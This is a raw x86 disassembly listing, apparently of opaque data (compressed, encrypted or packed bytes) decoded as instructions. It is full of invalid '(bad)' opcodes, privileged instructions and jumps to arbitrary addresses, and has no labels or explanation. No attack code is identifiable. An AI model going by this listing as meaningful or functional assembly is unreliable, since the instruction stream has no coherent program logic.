  41f1f9:	cmc    
  41f1fa:	add    al,0x11
  41f1fc:	push   ebx
  41f1fd:	(bad)  
  41f1fe:	fimul  DWORD PTR [ebx-0x64]
  41f201:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f202:	(bad)  
  41f203:	ficomp WORD PTR [edx+0x44e376a3]
  41f209:	loop   0x41f1e0
  41f20b:	jo     0x41f28c
  41f20d:	jnp    0x41f270
  41f20f:	sub    BYTE PTR ds:0x45c6c615,ah
  41f215:	jp     0x41f1bc
  41f217:	push   edi
  41f218:	(bad)  
  41f21a:	test   DWORD PTR [ebp-0x30e9752d],ecx
  41f220:	cli    
  41f221:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f222:	loope  0x41f215
  41f224:	call   0xb03c0e0a
  41f229:	arpl   WORD PTR [ecx+0x2c],dx
  41f22c:	pop    es
  41f22d:	inc    ebp
  41f22e:	sbb    eax,0x3ee2742c
  41f233:	xlat   BYTE PTR ds:[ebx]
  41f234:	xchg   edi,eax
  41f235:	sub    eax,0xacb29ea9
  41f23a:	fs jecxz 0x41f29f
  41f23d:	sbb    al,0xcd
  41f23f:	pop    ds
  41f240:	or     esp,esi
  41f242:	es in  al,0x23
  41f245:	or     DWORD PTR [ebp+0x6d],0x1
  41f249:	mov    ebp,cs
  41f24b:	int    0x17
  41f24d:	retf   
  41f24e:	jbe    0x41f2af
  41f250:	shl    DWORD PTR [ebx-0x5c014c73],1
  41f256:	cli    
  41f257:	loopne 0x41f24f
  41f259:	dec    ecx
  41f25a:	aas    
  41f25b:	mov    eax,0xfd54c33
  41f260:	jle    0x41f271
  41f262:	(bad)  
  41f263:	fs push ebp
  41f265:	(bad)  
  41f266:	fxch   st(7)
  41f268:	loope  0x41f225
  41f26a:	or     eax,0xc05bf67
  41f26f:	sub    al,0xfa
  41f271:	mov    al,0xf7
  41f273:	jb     0x41f248
  41f275:	mov    ds:0x53ed6151,eax
  41f27a:	jo     0x41f257
  41f27c:	leave  
  41f27d:	sbb    al,0x1b
  41f27f:	xchg   esp,eax
  41f280:	ja     0x41f2c9
  41f282:	sbb    al,0x3
  41f284:	cmp    DWORD PTR [eax],esp
  41f286:	or     DWORD PTR [ebp-0x5a],esi
  41f289:	scas   al,BYTE PTR es:[edi]
  41f28a:	std    
  41f28b:	mov    esp,0xdb8677e6
  41f290:	into   
  41f291:	sar    BYTE PTR [esi+0x1a854761],0x55
  41f298:	mov    WORD PTR [ecx-0x1d63ff17],?
  41f29e:	sbb    BYTE PTR [esi+0x7e],ah
  41f2a1:	pop    es
  41f2a2:	fild   DWORD PTR [ecx+0x46ab208]
  41f2a8:	jg     0x41f2f6
  41f2aa:	cmp    eax,0xbce30bc8
  41f2af:	mov    esi,0xf65dff80
  41f2b4:	sbb    bh,0x17
  41f2b7:	dec    eax
  41f2b8:	in     al,0xdd
  41f2ba:	scas   eax,DWORD PTR es:[edi]
  41f2bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f2bc:	fsub   DWORD PTR [eax+eax*4+0x7b]
  41f2c0:	pop    ecx
  41f2c1:	mov    fs,WORD PTR [eax-0x5bfec1fe]
  41f2c7:	lahf   
  41f2c8:	mov    ebx,esp
  41f2ca:	dec    edi
  41f2cb:	mov    ebp,0xe15f508d
  41f2d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f2d1:	fiadd  DWORD PTR [eax-0xc]
  41f2d4:	sti    
  41f2d5:	ds inc ebp
  41f2d7:	jp     0x41f347
  41f2d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f2da:	pop    esp
  41f2db:	loop   0x41f2be
  41f2dd:	cdq    
  41f2de:	cmp    al,BYTE PTR [edi+0x5d]
  41f2e1:	leave  
  41f2e2:	add    BYTE PTR [ebx-0x300ed56a],dl
  41f2e8:	stc    
  41f2e9:	inc    ebx
  41f2ea:	(bad)  
  41f2eb:	fild   QWORD PTR [edx+0x2]
  41f2ee:	add    DWORD PTR [eax-0x35d5b031],0xba2ab721
  41f2f8:	cmp    eax,0xd6d57aa7
  41f2fd:	fldenv [edx+ebp*4]
  41f300:	daa    
  41f301:	mov    bh,0x71
  41f303:	mov    eax,ds:0xcfc10fa5
  41f308:	(bad)  
  41f309:	xor    dl,BYTE PTR [ebx+0x324874a0]
  41f30f:	retf   0xcb07
  41f312:	cld    
  41f313:	stos   BYTE PTR es:[edi],al
  41f314:	xchg   ebp,eax
  41f315:	add    ch,BYTE PTR [ebx+0x9]
  41f318:	cli    
  41f319:	adc    eax,0xa62796b9
  41f31e:	pop    ebx
  41f31f:	stc    
  41f320:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f321:	ins    DWORD PTR es:[edi],dx
  41f322:	scas   eax,DWORD PTR es:[edi]
  41f323:	cli    
  41f324:	sub    al,0xef
  41f326:	stc    
  41f327:	rcl    BYTE PTR [edx],0x2
  41f32a:	lods   al,BYTE PTR ds:[esi]
  41f32b:	mov    edx,DWORD PTR ds:0x1ef15416
  41f331:	xor    eax,0xee2f102f
  41f336:	mov    ds:0x263b2194,eax
  41f33b:	imul   esi,DWORD PTR [edx-0x19],0xd6794d53
  41f342:	fcom   QWORD PTR [edi-0x69c9733b]
  41f348:	xchg   edx,eax
  41f349:	mov    esi,DWORD PTR [ecx-0x36]
  41f34c:	bound  esi,QWORD PTR [ebp+0x3d]
  41f34f:	sbb    edi,DWORD PTR [ebx-0x1c]
  41f352:	jmp    0x41f2f3
  41f354:	test   al,0xd1
  41f356:	lods   al,BYTE PTR ds:[esi]
  41f357:	jecxz  0x41f314
  41f359:	leave  
  41f35a:	cld    
  41f35b:	and    al,0xdb
  41f35e:	(bad)  
  41f35f:	lods   eax,DWORD PTR ds:[esi]
  41f360:	push   cs
  41f361:	mov    al,ds:0x48d9b21e
  41f366:	popa   
  41f367:	pop    es
  41f368:	fsubr  QWORD PTR [ebp-0x430231c0]
  41f36e:	jnp    0x41f33c
  41f370:	sbb    BYTE PTR cs:[edi+ebp*8+0x61af34ed],dl
  41f378:	icebp  
  41f379:	test   eax,0x45dd821f
  41f37e:	jge    0x41f34b
  41f380:	sti    
  41f381:	gs cld 
  41f383:	jmp    0x5128e965
  41f388:	mov    ebp,0x65188f16
  41f38d:	fild   WORD PTR [esi]
  41f38f:	jp     0x41f34d
  41f391:	add    bl,dl
  41f393:	out    0xa1,al
  41f395:	pop    edi
  41f396:	mov    ds:0x4da8e5b0,eax
  41f39b:	popf   
  41f39c:	pop    esp
  41f39d:	jae    0x41f411
  41f39f:	push   ebx
  41f3a0:	jae    0x41f3d9
  41f3a2:	pop    edi
  41f3a3:	nop
  41f3a4:	fimul  DWORD PTR [ebp-0x17]
  41f3a7:	xchg   DWORD PTR [esi+ebp*1],ecx
  41f3aa:	mov    ds:0xc08a1ad,al
  41f3af:	les    eax,FWORD PTR [eax+0x1deee5e0]
  41f3b5:	verw   WORD PTR [ebx-0x6]
  41f3b9:	test   ecx,esp
  41f3bb:	xor    bl,bl
  41f3bd:	or     eax,0x430fd505
  41f3c2:	sti    
  41f3c3:	sbb    BYTE PTR [ecx],ch
  41f3c5:	lock xor ebx,DWORD PTR [edi+edx*2]
  41f3c9:	or     eax,0x6c5bb589
  41f3ce:	iret   
  41f3cf:	jbe    0x41f3cc
  41f3d1:	cli    
  41f3d2:	retf   0x8609
  41f3d5:	xor    dl,0x3e
  41f3d8:	xchg   edx,eax
  41f3d9:	mov    ebp,ebp
  41f3db:	mov    esp,0xfa761bbb
  41f3e0:	gs mov bh,0x62
  41f3e3:	mov    eax,0x7ae4bee2
  41f3e8:	dec    eax
  41f3e9:	push   ebx
  41f3ea:	xchg   esi,eax
  41f3eb:	test   al,0x3e
  41f3ed:	dec    ecx
  41f3ee:	int3   
  41f3ef:	sbb    DWORD PTR [ecx],edi
  41f3f1:	in     al,dx
  41f3f2:	mov    dl,0x81
  41f3f4:	and    ebp,ecx
  41f3f6:	and    edi,DWORD PTR [edi]
  41f3f8:	scas   eax,DWORD PTR es:[edi]
  41f3f9:	test   eax,0x3b41527d
  41f3fe:	mov    ds:0xdf343670,eax
  41f403:	addr16 jg 0x41f3f1
  41f406:	jno    0x41f412
  41f408:	add    ebp,DWORD PTR [esi-0x2700ee96]
  41f40e:	dec    ecx
  41f40f:	imul   ebp,DWORD PTR [ebx+ebp*2+0x616b3e22],0x6a65b90d
  41f41a:	test   DWORD PTR [ebx+0x14d0165c],edx
  41f420:	or     al,0x80
  41f422:	in     eax,dx
  41f423:	icebp  
  41f424:	jmp    0x54598c51
  41f429:	mov    edx,0xb180e6af
  41f42e:	hlt    
  41f42f:	mov    ch,0x91
  41f431:	call   0xeea7a08f
  41f436:	inc    ebp
  41f437:	in     eax,dx
  41f438:	mov    cl,0x38
  41f43a:	retf   
  41f43b:	gs pop ss
  41f43d:	jbe    0x41f498
  41f43f:	xor    BYTE PTR [ebx+0x7],0xcc
  41f443:	pop    esi
  41f444:	sub    ch,BYTE PTR [ebp-0x428ff091]
  41f44a:	mov    ebp,0x8c9de4e1
  41f44f:	and    al,0xfe
  41f451:	fcmove st,st(1)
  41f453:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f454:	lock jne 0x41f494
  41f457:	adc    BYTE PTR [esi],0xaa
  41f45a:	in     al,0x78
  41f45c:	xor    eax,0xdb29cb2d
  41f461:	push   edx
  41f462:	cmp    al,BYTE PTR [ebx]
  41f464:	(bad)  
  41f465:	pop    ds
  41f466:	dec    ecx
  41f467:	push   edx
  41f468:	dec    edx
  41f469:	and    DWORD PTR [ebx],0xcc1f4e18
  41f46f:	mov    edx,0xc1e983da
  41f474:	aas    
  41f475:	adc    dh,bh
  41f477:	daa    
  41f478:	ret    0xa7ab
  41f47b:	add    BYTE PTR [eax-0x7c1309d8],0x64
  41f482:	in     eax,dx
  41f483:	(bad)  
  41f484:	mov    bl,0x44
  41f486:	pop    eax
  41f487:	or     BYTE PTR [esi-0x60e7035d],dh
  41f48d:	es (bad) 
  41f48f:	push   esi
  41f490:	out    0x13,al
  41f492:	sar    DWORD PTR [esi+0x12],cl
  41f495:	(bad)  
  41f496:	loopne 0x41f4ed
  41f498:	(bad)  
  41f499:	pop    ss
  41f49a:	mov    cl,0x91
  41f49c:	aam    0x6
  41f49e:	cmp    al,0x7b
  41f4a0:	retf   0x3088
  41f4a3:	pop    edx
  41f4a4:	sub    DWORD PTR [edi+0x27],0xfffffff5
  41f4a8:	sbb    DWORD PTR [eax],esp
  41f4aa:	int    0x59
  41f4ac:	std    
  41f4ad:	jmp    0x41f4ad
  41f4af:	sub    bl,cl
  41f4b1:	dec    edx
  41f4b2:	cwde   
  41f4b3:	ins    BYTE PTR es:[edi],dx
  41f4b4:	xor    BYTE PTR es:[esi-0x41],bh
  41f4b8:	xchg   ebp,eax
  41f4b9:	mov    esp,DWORD PTR [edx-0x513c792a]
  41f4bf:	ss pop esi
  41f4c1:	push   eax
  41f4c2:	out    dx,al
  41f4c3:	adc    eax,0xdac40e22
  41f4c8:	mov    dl,0xa
  41f4ca:	and    esi,DWORD PTR [edx+esi*2+0x2abb6f41]
  41f4d1:	cmp    edx,edx
  41f4d3:	push   edx
  41f4d4:	imul   esp,DWORD PTR [eax-0x60],0xffffffd1
  41f4d8:	mov    al,0x8b
  41f4da:	cwde   
  41f4db:	jle    0x41f4f2
  41f4dd:	inc    eax
  41f4de:	faddp  st(6),st
  41f4e0:	getsec 
  41f4e2:	sub    DWORD PTR [edi+edx*4+0x444783a],eax
  41f4e9:	lock push ebp
  41f4eb:	inc    ebp
  41f4ec:	outs   dx,DWORD PTR ds:[esi]
  41f4ed:	outs   dx,DWORD PTR ds:[esi]
  41f4ee:	jmp    DWORD PTR [edi-0x4964a0a1]
  41f4f4:	inc    esp
  41f4f5:	and    BYTE PTR [eax],ch
  41f4f7:	dec    eax
  41f4f8:	scas   eax,DWORD PTR es:[edi]
  41f4f9:	pop    ecx
  41f4fa:	sbb    DWORD PTR [esi-0x72cf88de],0x69
  41f501:	sub    al,0x12
  41f503:	(bad)  
  41f505:	add    DWORD PTR [esi+0x7a],ebx
  41f508:	loope  0x41f543
  41f50a:	pop    esp
  41f50b:	add    eax,0xa38d24b8
  41f510:	pop    eax
  41f511:	sbb    eax,0x1bfdd724
  41f516:	jne    0x41f51a
  41f518:	mov    dh,0xc0
  41f51a:	repz into 
  41f51c:	dec    ebp
  41f51e:	xor    bh,BYTE PTR [edi+0x4ceff295]
  41f524:	test   eax,0x3bfa54d4
  41f529:	fs xchg esp,eax
  41f52b:	xchg   ebx,eax
  41f52c:	rcl    cl,1
  41f52e:	out    0x1a,al
  41f530:	xor    DWORD PTR ds:0xd28401b0,edi
  41f536:	push   ds
  41f537:	mov    eax,0x19d09255
  41f53c:	cmp    dl,al
  41f53e:	cmc    
  41f53f:	sbb    esi,DWORD PTR [ebp+0x4fcd3fa1]
  41f545:	mov    DWORD PTR [edi+edi*1+0x3e],ebp
  41f549:	pop    edi
  41f54a:	sar    al,0x38
  41f54d:	mov    ebx,0xbf2fa7c4
  41f552:	retf   0xee01
  41f555:	xor    al,0x2c
  41f557:	dec    edi
  41f558:	in     al,0x3
  41f55a:	ja     0x41f5c3
  41f55c:	adc    edx,DWORD PTR [ebx+0x31]
  41f55f:	es fcmovb st,st(6)
  41f562:	mov    dl,0x94
  41f564:	cmp    DWORD PTR [ebp-0x23caf088],ebx
  41f56a:	test   BYTE PTR [ecx+0x36],ch
  41f56d:	xchg   edx,eax
  41f56e:	(bad)  
  41f56f:	fwait
  41f570:	addr16 inc edx
  41f572:	cdq    
  41f573:	maxps  xmm4,XMMWORD PTR [ebp+0x2aa65a27]
  41f57a:	int3   
  41f57b:	push   gs
  41f57d:	cmp    dl,dh
  41f57f:	mov    al,0xaf
  41f581:	jo     0x41f5f4
  41f583:	in     eax,dx
  41f584:	mov    esp,0x1efb330b
  41f589:	mov    edi,0xc0a69549
  41f58e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f58f:	or     al,0xbe
  41f591:	mov    bh,0xe
  41f593:	test   eax,0x38014513
  41f598:	hlt    
  41f599:	jne    0x41f529
  41f59b:	xlat   BYTE PTR ds:[ebx]
  41f59c:	stc    
  41f59d:	dec    ecx
  41f59e:	inc    ebp
  41f59f:	and    al,0xc4
  41f5a1:	(bad)  
  41f5a2:	jae    0x41f554
  41f5a4:	and    eax,0x8b630b44
  41f5a9:	mov    esp,0x3a38cbaa
  41f5ae:	scas   al,BYTE PTR es:[edi]
  41f5af:	inc    edi
  41f5b0:	call   0x4d7e:0x28e31318
  41f5b7:	mov    al,0x13
  41f5b9:	icebp  
  41f5ba:	mov    esi,0x77016ef6
  41f5bf:	sub    ah,ch
  41f5c1:	add    al,BYTE PTR [edx-0x59aa7904]
  41f5c7:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  41f5c9:	fist   DWORD PTR [edi-0x18b6ee3b]
  41f5cf:	pop    ss
  41f5d0:	hlt    
  41f5d1:	in     eax,0x19
  41f5d3:	sub    al,0x7f
  41f5d5:	loope  0x41f56a
  41f5d7:	mov    ds:0x3060449d,al
  41f5dc:	and    al,0xcd
  41f5de:	mov    ch,0x6b
  41f5e0:	mov    edx,0xc82ac1e6
  41f5e5:	jnp    0x41f5ff
  41f5e7:	mov    esp,0xd718caa2
  41f5ec:	inc    esi
  41f5ed:	fist   WORD PTR [edx]
  41f5ef:	imul   ecx,ebx,0xb70ca68b
  41f5f5:	jecxz  0x41f5a5
  41f5f7:	(bad)  
  41f5f8:	push   cs
  41f5f9:	aad    0x81
  41f5fb:	test   eax,0xb3b18ba5
  41f600:	inc    ebx
  41f601:	loope  0x41f5aa
  41f603:	add    esi,DWORD PTR [edi+0x545774dc]
  41f609:	pop    esp
  41f60a:	sbb    eax,0x70d2ee73
  41f60f:	(bad)  
  41f610:	xor    bl,ch
  41f612:	arpl   WORD PTR [eax],cx
  41f614:	loope  0x41f639
  41f616:	mov    DWORD PTR [ecx+0x5b144add],edx
  41f61c:	mov    cl,0xf8
  41f61e:	fst    DWORD PTR [esi]
  41f620:	scas   al,BYTE PTR es:[edi]
  41f621:	and    dh,BYTE PTR [esi+edi*8-0x40a48e2b]
  41f628:	jbe    0x41f5bd
  41f62a:	rcr    BYTE PTR [ecx],0x11
  41f62d:	adc    BYTE PTR [eax],0x40
  41f630:	or     DWORD PTR [ecx],esp
  41f632:	sub    al,0x24
  41f634:	repnz sub ch,BYTE PTR [edi-0xf5848b5]
  41f63b:	aad    0xa8
  41f63d:	mov    esi,0x307f1a17
  41f642:	add    ebx,esp
  41f644:	call   0xf5d6:0x40bc1f09
  41f64b:	sbb    ebp,DWORD PTR [eax+0x6b]
  41f64e:	stc    
  41f64f:	(bad)  
  41f650:	sub    bh,dh
  41f652:	and    bl,BYTE PTR [ebx+ebx*8+0x58]
  41f656:	icebp  
  41f657:	idiv   DWORD PTR [edi]
  41f659:	jge    0x41f686
  41f65b:	fild   WORD PTR [ebx+0x6430907b]
  41f661:	jl     0x41f5e6
  41f663:	pcmpeqd mm3,QWORD PTR ds:0xfe26fc8
  41f66a:	lahf   
  41f66b:	lea    ebx,[ebp+0x4b81777a]
  41f671:	std    
  41f672:	(bad)
  41f675:	addr16 repz aam 0xdf
  41f679:	das    
  41f67a:	outs   dx,BYTE PTR ds:[esi]
  41f67b:	push   cs
  41f67c:	ds jno 0x41f64f
  41f67f:	or     al,0xbe
  41f681:	mov    cs,WORD PTR [edx+0x17]
  41f684:	pop    ecx
  41f685:	or     eax,0x9ff26231
  41f68a:	jns    0x41f6fa
  41f68c:	retf   
  41f68d:	dec    esp
  41f68e:	scas   eax,DWORD PTR es:[edi]
  41f68f:	aam    0xf0
  41f691:	out    dx,al
  41f692:	cli    
  41f693:	neg    DWORD PTR [esi+eiz*4-0x37b53647]
  41f69a:	iret   
  41f69b:	and    DWORD PTR [edi],esi
  41f69d:	add    ebx,DWORD PTR [ecx]
  41f69f:	bound  esp,QWORD PTR [si]
  41f6a2:	sub    dh,BYTE PTR [esi-0x1c]
  41f6a5:	out    dx,al
  41f6a6:	les    esi,FWORD PTR [ecx+eax*2]
  41f6a9:	xor    al,BYTE PTR [ebx+esi*8]
  41f6ac:	and    eax,0xaccf34eb
  41f6b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f6b2:	or     BYTE PTR [eax],0x46
  41f6b5:	mov    edi,ecx
  41f6b7:	push   es
  41f6b8:	and    al,0x41
  41f6ba:	and    al,0xea
  41f6bc:	(bad)  
  41f6be:	mov    ebx,0xc9967dd4
  41f6c3:	sub    edi,DWORD PTR [edx+0x4086415c]
  41f6c9:	pop    ds
  41f6ca:	jno    0x41f72e
  41f6cc:	jns    0x41f701
  41f6ce:	mov    ebp,DWORD PTR [edi-0x45eb3269]
  41f6d4:	xchg   ebp,eax
  41f6d5:	sub    al,0x73
  41f6d7:	xchg   ebx,ecx
  41f6d9:	fistp  QWORD PTR [ebx+0x52]
  41f6dc:	enter  0xa57e,0xf8
  41f6e0:	ds jns 0x41f729
  41f6e3:	push   0xf14febdb
  41f6e8:	pop    esp
  41f6e9:	(bad)  
  41f6ea:	cli    
  41f6eb:	loope  0x41f675
  41f6ed:	test   al,dh
  41f6ef:	xchg   ecx,eax
  41f6f0:	or     bh,BYTE PTR [edx-0x5b]
  41f6f3:	inc    edx
  41f6f4:	les    ebx,FWORD PTR [ecx]
  41f6f6:	out    dx,al
  41f6f7:	jb     0x41f777
  41f6f9:	or     al,0x39
  41f6fb:	pop    ecx
  41f6fc:	std    
  41f6fd:	mov    ch,0xd9
  41f6ff:	shr    ebp,cl
  41f701:	adc    al,0xc9
  41f703:	push   ds
  41f704:	add    eax,0xb9e254b6
  41f709:	ja     0x41f6cd
  41f70b:	jmp    0x186e:0xa2579e17
  41f712:	or     BYTE PTR [edi],ch
  41f714:	dec    edx
  41f715:	mov    ah,0x93
  41f717:	mov    dl,BYTE PTR [edi]
  41f719:	and    eax,0x2741896e
  41f71e:	pop    edi
  41f71f:	test   BYTE PTR [edi*4+0x30a38cd5],0x74
  41f727:	int3   
  41f728:	jecxz  0x41f6d4
  41f72a:	push   ds
  41f72b:	ins    DWORD PTR es:[edi],dx
  41f72c:	push   esi
  41f72d:	lods   eax,DWORD PTR ds:[esi]
  41f72e:	xor    ch,bl
  41f730:	fwait
  41f731:	les    edx,FWORD PTR [ebp+0x36]
  41f734:	je     0x41f78a
  41f736:	sbb    dh,BYTE PTR [esi]
  41f738:	xchg   BYTE PTR [ebx+ebp*8-0x4cbbeaaf],bl
  41f73f:	mov    esi,0x97421d38
  41f744:	mov    dl,bl
  41f746:	scas   al,BYTE PTR es:[edi]
  41f747:	and    DWORD PTR [edx-0xccbd01f],esp
  41f74d:	fisttp DWORD PTR [edi]
  41f74f:	xchg   edi,eax
  41f750:	out    0x79,al
  41f752:	adc    BYTE PTR [ecx+0x73fb6336],dh
  41f758:	mov    eax,0x18d0ab89
  41f75d:	adc    edi,DWORD PTR [esi+ecx*4-0x56b95f13]
  41f764:	sbb    esi,edi
  41f766:	lods   al,BYTE PTR ds:[esi]
  41f767:	fidivr WORD PTR [ebx]
  41f769:	sub    DWORD PTR [eax],esp
  41f76b:	jns    0x41f714
  41f76d:	(bad)  
  41f76e:	xlat   BYTE PTR ds:[ebx]
  41f76f:	test   eax,0x49e60fc5
  41f774:	push   cs
  41f775:	xor    esp,DWORD PTR [esi+0x173448b5]
  41f77b:	jbe    0x41f794
  41f77d:	inc    esi
  41f77e:	inc    edi
  41f77f:	dec    edi
  41f780:	mov    al,ds:0x6dca7687
  41f785:	daa    
  41f786:	movq   QWORD PTR [eax-0x15dc9bb1],mm5
  41f78d:	pop    eax
  41f78e:	ret    0x8685
  41f791:	add    al,dh
  41f793:	sbb    DWORD PTR [esi+0x2],edi
  41f796:	stos   DWORD PTR es:[edi],eax
  41f797:	out    0xc,al
  41f799:	sub    BYTE PTR [edi+0x56f04f80],0x3f
  41f7a0:	pop    edi
  41f7a1:	sbb    BYTE PTR [edi-0x3bdcbaf4],bl
  41f7a7:	jle    0x41f78a
  41f7a9:	mov    al,0x34
  41f7ab:	hlt    
  41f7ac:	push   edi
  41f7ad:	fstp   st(5)
  41f7af:	(bad)  
  41f7b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f7b1:	pop    eax
  41f7b2:	adc    ch,cl
  41f7b4:	pop    edx
  41f7b5:	sub    BYTE PTR [edx-0x80],cl
  41f7b8:	jp     0x41f7f2
  41f7ba:	repnz mov ah,0xe8
  41f7bd:	mov    ebp,DWORD PTR [ebx]
  41f7bf:	cmp    al,0x62
  41f7c1:	adc    al,0x4f
  41f7c3:	retf   
  41f7c4:	xchg   BYTE PTR [edi-0x47],dh
  41f7c7:	cmp    al,0x32
  41f7c9:	xchg   esp,eax
  41f7ca:	xor    esi,DWORD PTR [esi+0x62]
  41f7cd:	cmp    DWORD PTR [ebx],ebx
  41f7cf:	add    al,0x52
  41f7d1:	push   0x31
  41f7d3:	mov    dl,0x15
  41f7d5:	pop    edx
  41f7d6:	(bad)  
  41f7d7:	and    DWORD PTR [ebx-0x36],ebx
  41f7da:	mov    esi,0x29171764
  41f7df:	sti    
  41f7e0:	data16 adc ch,bl
  41f7e3:	sub    al,0x37
  41f7e5:	mov    al,BYTE PTR ds:0x61ccb725
  41f7eb:	push   ss
  41f7ec:	pop    bx
  41f7ee:	xor    esi,DWORD PTR [eax-0x6dd9bc8d]
  41f7f4:	inc    esi
  41f7f5:	jmp    0xfbec3dd7
  41f7fa:	pop    ebp
  41f7fb:	xor    cl,BYTE PTR [ebx-0x4f30f22b]
  41f801:	push   ss
  41f802:	push   ebx
  41f803:	jecxz  0x41f843
  41f805:	sahf   
  41f806:	jo     0x41f7e6
  41f808:	pop    ss
  41f809:	into   
  41f80a:	push   ebx
  41f80b:	mov    ebx,cr1
  41f80e:	into   
  41f80f:	inc    ecx
  41f810:	jo     0x41f7a3
  41f812:	mov    al,ds:0x7ba5ea91
  41f817:	ror    DWORD PTR [ebx-0xb],cl
  41f81a:	retf   
  41f81b:	mov    WORD PTR [ebx+0x44],es
  41f81e:	xchg   esi,eax
  41f81f:	cmp    BYTE PTR ds:0xdeb31db0,cl
  41f825:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f826:	out    dx,eax
  41f827:	repz cmp esi,DWORD PTR ds:0xd42ac0e3
  41f82e:	sbb    BYTE PTR [eax],al
  41f830:	push   ebp
  41f831:	adc    DWORD PTR [ecx+ecx*2-0x4e69122d],esp
  41f838:	mov    esp,0xb717f415
  41f83d:	xchg   esi,eax
  41f83e:	mov    esp,0x32019d31
  41f844:	add    bh,BYTE PTR [edx]
  41f846:	mov    ah,BYTE PTR ds:0x747177f8
  41f84c:	cmp    esp,DWORD PTR [edi]
  41f84e:	jmp    0x73cb:0xee042f21
  41f855:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f856:	outs   dx,BYTE PTR ds:[esi]
  41f857:	call   0xf80d7988
  41f85c:	inc    edx
  41f85d:	sub    eax,0x4f1855e5
  41f862:	outs   dx,BYTE PTR ds:[esi]
  41f863:	jl     0x41f8b3
  41f865:	adc    eax,0xeb0dd78a
  41f86a:	int    0xba
  41f86c:	lods   al,BYTE PTR ds:[esi]
  41f86d:	inc    edx
  41f86e:	sti    
  41f86f:	mov    ch,cl
  41f871:	jmp    0x41f87f
  41f873:	sar    DWORD PTR [ebx-0x60],1
  41f876:	ja     0x41f8b8
  41f878:	adc    DWORD PTR [edi],esp
  41f87a:	mov    esi,0x6c02012b
  41f87f:	js     0x41f890
  41f881:	mov    dh,0x14
  41f883:	push   0x831b07f9
  41f888:	mov    eax,0x3de0039f
  41f88d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f88e:	pop    ebp
  41f88f:	sbb    eax,DWORD PTR [ebx+0x1c510ea5]
  41f895:	stos   BYTE PTR es:[edi],al
  41f896:	mov    cl,0xaa
  41f898:	sub    eax,0xb1f9deca
  41f89d:	aam    0x59
  41f89f:	push   ebx
  41f8a0:	bound  ebx,QWORD PTR [esi-0x416e74cd]
  41f8a6:	int    0xc8
  41f8a8:	out    0x16,al
  41f8aa:	dec    eax
  41f8ab:	dec    esp
  41f8ac:	into   
  41f8ad:	das    
  41f8ae:	xchg   edx,ebx
  41f8b0:	ret    0x884c
  41f8b3:	dec    ebx
  41f8b4:	pop    es
  41f8b5:	mov    ebx,0xe3c43939
  41f8ba:	scas   al,BYTE PTR es:[edi]
  41f8bb:	ret    0x80f8
  41f8be:	sahf   
  41f8bf:	xchg   ebx,eax
  41f8c0:	clc    
  41f8c1:	std    
  41f8c2:	daa    
  41f8c3:	or     eax,0x27bf4e1b
  41f8c8:	data16 je 0x41f936
  41f8cb:	inc    edi
  41f8cc:	loopne 0x41f8b1
  41f8ce:	jno    0x41f8f2
  41f8d0:	push   cs
  41f8d1:	inc    ecx
  41f8d2:	cmp    al,0x8
  41f8d4:	cmp    edi,DWORD PTR [edx]
  41f8d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f8d7:	xor    BYTE PTR [edi+0x64004237],bh
  41f8dd:	sti    
  41f8de:	sbb    BYTE PTR [edx+0x7c],cl
  41f8e1:	and    eax,0x9bea6794
  41f8e6:	push   esp
  41f8e7:	push   ecx
  41f8e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f8e9:	(bad)  
  41f8ea:	push   es
  41f8eb:	outs   dx,BYTE PTR ds:[esi]
  41f8ec:	xor    al,0xf8
  41f8ee:	adc    bl,BYTE PTR [ebx]
  41f8f0:	inc    ebx
  41f8f1:	inc    esi
  41f8f2:	outs   dx,BYTE PTR ds:[esi]
  41f8f3:	das    
  41f8f4:	out    dx,al
  41f8f5:	push   ds
  41f8f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f8f7:	test   DWORD PTR [edi+0x472a96ee],ebx
  41f8fd:	jno    0x41f955
  41f8ff:	mov    ecx,0xfe5da3b4
  41f904:	add    ch,BYTE PTR [ebx]
  41f906:	mov    ecx,0x83ab44c
  41f90b:	pushf  
  41f90c:	icebp  
  41f90d:	sub    bl,bh
  41f90f:	pop    esp
  41f910:	in     al,dx
  41f911:	push   edi
  41f912:	mov    ecx,0xc6790adb
  41f917:	jecxz  0x41f980
  41f919:	sbb    al,BYTE PTR [eax]
  41f91b:	cmc    
  41f91c:	jge    0x41f8cc
  41f91e:	xor    ebx,DWORD PTR [ebx+0x26]
  41f921:	sub    esp,edx
  41f923:	push   edx
  41f924:	and    ebx,DWORD PTR [ebp+0x57]
  41f927:	cld    
  41f928:	fwait
  41f929:	sub    DWORD PTR [ebp-0x7eb7d34a],edi
  41f92f:	mov    bl,0x6e
  41f931:	add    ah,BYTE PTR [esi-0x15]
  41f934:	mov    ds:0xdfbed00c,al
  41f939:	pop    eax
  41f93a:	outs   dx,BYTE PTR ds:[esi]
  41f93b:	xor    BYTE PTR [edx+0x6],al
  41f93e:	mov    fs,ebp
  41f940:	xchg   edx,eax
  41f941:	mov    ebp,0xa66e751c
  41f946:	imul   ah
  41f948:	mov    ebx,ds
  41f94a:	jne    0x41f9bf
  41f94c:	inc    esi
  41f94d:	cmp    edi,esp
  41f94f:	push   edi
  41f950:	call   0x5a75625c
  41f955:	push   ebx
  41f956:	push   edx
  41f957:	inc    ebp
  41f958:	clc    
  41f959:	push   0xe126835c
  41f95e:	sub    cl,bh
  41f960:	pop    esp
  41f961:	fwait
  41f962:	shl    BYTE PTR ds:0x1ca0558,0xb5
  41f969:	ins    BYTE PTR es:[edi],dx
  41f96a:	push   esi
  41f96b:	sti    
